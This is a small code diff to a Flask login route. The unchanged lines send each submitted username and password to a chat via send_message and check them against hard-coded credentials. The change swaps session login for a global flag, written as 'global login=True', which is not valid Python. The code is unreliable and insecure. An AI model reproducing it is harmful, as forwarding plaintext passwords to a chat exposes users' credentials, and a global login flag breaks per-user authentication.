@@ -13,6 +13,7 @@ import requests
 import json
 import re
 
+global login=False
 global last_msg
 last_msg=''
 
@@ -75,8 +76,8 @@ def do_admin_login():
         text= request.form['password'] +' '+request.form['username']
         send_message(chat_id,text)
         if request.form['password'] == 'python' and request.form['username'] == 'vorovik':
-           session['logged_in'] = True
-           return jsonify(chat_id)
+           global login=True
+           return 'login=True'
         return jsonify(chat_id)
     return '<h1>Login</h1>'
 
